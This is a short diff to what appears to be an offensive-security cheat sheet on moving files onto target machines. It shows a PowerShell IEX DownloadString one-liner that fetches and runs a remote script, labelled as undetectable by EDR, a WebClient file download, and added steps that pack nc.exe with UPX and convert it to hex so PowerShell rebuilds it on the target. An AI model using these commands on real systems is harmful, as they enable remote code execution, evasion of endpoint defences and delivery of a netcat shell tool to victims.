@@ -14,6 +14,10 @@ $file = "path\new.exe"
 $webclient.DownloadFile($url,$file)
 PS:IEX (New-Object System.Net.WebClient).DownloadString('path/d_f.ps1') -- Cant be detected by EDR
 ```
+```
+upx -9 nc.exe(compress to be smaller)
+exe2hex -x nc.exe -p nc.cmd(convert the file to hex and instruct powershell.exe to assemble it back into binary)
+```
 
 ### SCP Copy file from remote machine to local tmp
 scp john@localhost:/var/tmp/CopyMe.txt /tmp  
